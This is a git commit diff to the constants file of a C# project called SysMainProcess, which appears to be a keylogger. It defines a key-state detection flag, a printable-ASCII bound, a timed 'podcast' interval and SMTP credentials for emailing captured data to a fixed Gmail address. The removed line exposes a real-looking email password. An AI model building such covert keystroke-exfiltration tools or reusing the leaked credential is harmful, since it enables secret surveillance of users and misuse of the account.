b587ac348ae59c01238b44f4a3a6f7839561a5fb
Daniel Molinero Lucas <danielmolinero111@cyberdude.com>
2021-10-22 15:09:50 +0200

    Update SysMainProcess.Constants.cs

--- NET Framework/SysMainProcessNETF/SysMainProcess.Constants.cs
+++ NET Framework/SysMainProcessNETF/SysMainProcess.Constants.cs
@@ -5,9 +5,9 @@ namespace SysMainProcess
     partial class SysMainProcess
     {
         private const short KS_DETECT = -32767;
-        private const ushort SMTP_PORT = 587;
+        private const ushort SMTP_PORT = 587 /*Default for Gmail*/;
         private const uint PODCAST_INTERVAL = 60000 * 1;
-        private static readonly string[] PODCAST_EMISSOR_CREDENTIALS = { "andaracabaj@gmail.com", "@4cMdm9G97xNBbxLLpB#L97p$K74h!cb?o&K#g4!" };
+        private static readonly string[] PODCAST_EMISSOR_CREDENTIALS = { "$YOUR SMTP MAIL", "$YOUR PASSWORD HERE" };
         private const string PODCAST_RECEIVER = "andaracabaj@gmail.com";
         private const ushort THREAD_SLEEP_TIME = 5;
         private const ushort MIN_ASCII_CODE = 32;
